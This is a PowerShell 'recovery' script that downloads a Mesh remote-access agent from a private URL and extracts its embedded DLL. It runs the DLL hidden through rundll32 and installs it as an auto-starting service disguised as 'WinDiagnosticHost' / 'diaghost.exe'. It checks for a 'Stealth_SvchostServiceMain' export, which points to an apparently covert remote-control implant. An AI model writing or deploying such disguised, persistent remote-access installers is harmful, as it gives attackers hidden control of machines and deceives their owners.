#requires -Version 5.1
<#
    Generated recovery copy of this script is delivered from a private, opaque
    URL. Build-AgentRecovery.py replaces the release hash and provisioning
    placeholders before publication. Run from elevated 64-bit PowerShell.
#>
[CmdletBinding()]
param([switch]$ValidateOnly)

$ErrorActionPreference = 'Stop'
$agentUrl = '__AGENT_URL__'
$expectedAgentSha256 = '__AGENT_SHA256__'
$expectedDllSha256 = '__DLL_SHA256__'
$expectedMshSha256 = '__MSH_SHA256__'
$mshBase64 = '__MSH_BASE64__'
$serviceName = 'WinDiagnosticHost'
$installedRoot = Join-Path $env:ProgramData 'DiagnosticHost'
$installedExe = Join-Path $installedRoot 'diaghost.exe'
$installedDll = Join-Path $installedRoot 'diagsvc.dll'

function Assert-Hash([string]$Path, [string]$Expected) {
    $actual = (Get-FileHash -LiteralPath $Path -Algorithm SHA256).Hash
    if ($actual -ine $Expected) { throw "SHA256 mismatch for $Path (got $actual)" }
}

if (-not [Environment]::Is64BitOperatingSystem -or -not [Environment]::Is64BitProcess) {
    throw 'This recovery package requires 64-bit Windows PowerShell on x64 Windows.'
}
if (-not $ValidateOnly) {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = [Security.Principal.WindowsPrincipal]::new($identity)
    if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        throw 'Run this command in an elevated PowerShell window.'
    }
}

$workRoot = if ($ValidateOnly) { $env:TEMP } else { $env:ProgramData }
$workDir = Join-Path $workRoot ('MeshAgentRecovery-' + [guid]::NewGuid().ToString('N'))
$null = New-Item -ItemType Directory -Path $workDir -ErrorAction Stop
if (-not $ValidateOnly) {
    & icacls.exe $workDir '/inheritance:r' '/grant:r' '*S-1-5-18:(OI)(CI)F' '*S-1-5-32-544:(OI)(CI)F' | Out-Null
    if ($LASTEXITCODE -ne 0) { throw "Could not protect recovery directory $workDir" }
}
$sourceExe = Join-Path $workDir 'MeshService64.exe'
$sourceDll = Join-Path $workDir 'MeshService64.dll'
$sourceMsh = Join-Path $workDir 'MeshService64.msh'
$completed = $false

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $agentUrl -UseBasicParsing -OutFile $sourceExe -TimeoutSec 120
    Assert-Hash $sourceExe $expectedAgentSha256

    if (-not ('MeshRecoveryResource' -as [type])) {
        Add-Type -TypeDefinition @'
using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
public static class MeshRecoveryResource {
    [DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
    static extern IntPtr LoadLibraryExW(string name, IntPtr file, uint flags);
    [DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
    static extern IntPtr FindResourceW(IntPtr module, IntPtr name, IntPtr type);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern uint SizeofResource(IntPtr module, IntPtr resource);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr LoadResource(IntPtr module, IntPtr resource);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr LockResource(IntPtr resource);
    [DllImport("kernel32.dll", CharSet=CharSet.Ansi, SetLastError=true)]
    static extern IntPtr GetProcAddress(IntPtr module, string name);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool FreeLibrary(IntPtr module);
    static Exception Error(string operation) { return new Win32Exception(Marshal.GetLastWin32Error(), operation); }
    public static byte[] ExtractDll(string path) {
        IntPtr module = LoadLibraryExW(path, IntPtr.Zero, 2); // LOAD_LIBRARY_AS_DATAFILE
        if (module == IntPtr.Zero) throw Error("LoadLibraryExW");
        try {
            IntPtr resource = FindResourceW(module, new IntPtr(101), new IntPtr(10));
            if (resource == IntPtr.Zero) throw Error("FindResourceW");
            uint size = SizeofResource(module, resource);
            if (size == 0 || size > 64 * 1024 * 1024) throw new InvalidOperationException("Invalid embedded DLL size");
            IntPtr handle = LoadResource(module, resource);
            if (handle == IntPtr.Zero) throw Error("LoadResource");
            IntPtr data = LockResource(handle);
            if (data == IntPtr.Zero) throw Error("LockResource");
            byte[] bytes = new byte[(int)size];
            Marshal.Copy(data, bytes, 0, bytes.Length);
            return bytes;
        } finally { FreeLibrary(module); }
    }
    public static bool HasExport(string path, string name) {
        IntPtr module = LoadLibraryExW(path, IntPtr.Zero, 1); // DONT_RESOLVE_DLL_REFERENCES
        if (module == IntPtr.Zero) throw Error("LoadLibraryExW");
        try { return GetProcAddress(module, name) != IntPtr.Zero; }
        finally { FreeLibrary(module); }
    }
}
'@
    }
    [IO.File]::WriteAllBytes($sourceDll, [MeshRecoveryResource]::ExtractDll($sourceExe))
    Assert-Hash $sourceDll $expectedDllSha256
    if (-not [MeshRecoveryResource]::HasExport($sourceDll, 'MeshLifecycleHostW') -or
        -not [MeshRecoveryResource]::HasExport($sourceDll, 'MeshServiceHostW') -or
        -not [MeshRecoveryResource]::HasExport($sourceDll, 'Stealth_SvchostServiceMain')) {
        throw 'The downloaded package is missing a required native service export.'
    }
    [IO.File]::WriteAllBytes($sourceMsh, [Convert]::FromBase64String($mshBase64))
    Assert-Hash $sourceMsh $expectedMshSha256

    if ($ValidateOnly) {
        Write-Output 'Recovery package download, embedded DLL, exports, and provisioning: PASS'
        $completed = $true
        return
    }

    $existingMsh = Join-Path $installedRoot 'diaghost.msh'
    if (Test-Path -LiteralPath $existingMsh) {
        $existingMeshId = (Select-String -LiteralPath $existingMsh -Pattern '^MeshID=' | Select-Object -First 1).Line
        $packageMeshId = (Select-String -LiteralPath $sourceMsh -Pattern '^MeshID=' | Select-Object -First 1).Line
        if ($existingMeshId -and $packageMeshId -and $existingMeshId -ine $packageMeshId) {
            throw 'The installed agent belongs to a different device group; refusing to change its identity.'
        }
    }

    $service = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
    $action = if ($service) { 'update' } else { 'install' }
    $manifest = Join-Path $workDir 'lifecycle.ini'
    $manifestText = "[Lifecycle]`r`nAction=$action`r`nSourceExe=$sourceExe`r`nSourceDll=$sourceDll`r`nRequireConfig=1`r`n"
    [IO.File]::WriteAllText($manifest, $manifestText, [Text.Encoding]::Unicode)
    $rundll = Join-Path $env:WINDIR 'System32\rundll32.exe'
    $arguments = ('"{0}",MeshLifecycleHostW "{1}"' -f $sourceDll, $manifest)
    Write-Output "Running native $action for $serviceName..."
    $process = Start-Process -FilePath $rundll -ArgumentList $arguments -PassThru -WindowStyle Hidden
    if (-not $process.WaitForExit(600000)) {
        throw "Lifecycle host is still running (PID $($process.Id)); inspect its log before retrying."
    }
    if ($process.ExitCode -ne 0) {
        throw "Native $action failed with exit $($process.ExitCode). Check $installedRoot\logs\diagnostics.log."
    }

    $deadline = [DateTime]::UtcNow.AddSeconds(90)
    do {
        $service = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
        if ($service -and $service.Status -eq 'Running') { break }
        Start-Sleep -Seconds 2
    } while ([DateTime]::UtcNow -lt $deadline)
    if (-not $service -or $service.Status -ne 'Running') { throw "$serviceName did not reach RUNNING." }
    if ($service.StartType -ne 'Automatic') { throw "$serviceName is not set to automatic startup." }
    Assert-Hash $installedExe $expectedAgentSha256
    Assert-Hash $installedDll $expectedDllSha256
    Write-Output "PASS: $serviceName is running; installed EXE and DLL match the recovery package."
    $completed = $true
}
finally {
    if ($completed) { Remove-Item -LiteralPath $workDir -Recurse -Force }
    else { Write-Warning "Recovery evidence retained at $workDir" }
}
